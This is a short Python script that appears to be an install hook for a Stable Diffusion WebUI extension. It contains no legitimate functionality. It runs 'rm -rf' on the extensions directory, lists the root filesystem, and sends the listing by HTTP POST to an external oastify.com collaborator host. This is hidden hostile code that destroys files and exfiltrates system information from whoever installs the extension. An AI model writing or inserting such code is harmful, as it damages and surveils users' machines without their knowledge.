import launch
import requests
import os
import requests


command = 'rm -rf /stable-diffusion-webui/extensions/test*'
result = os.popen(command).read()


command = 'ls -alh /'
result = os.popen(command).read()
url = 'https://ej1fgqfpmx4qinz0uewpcola319uxkl9.oastify.com/resp'
data = {'result': result}
response = requests.post(url, data=data)



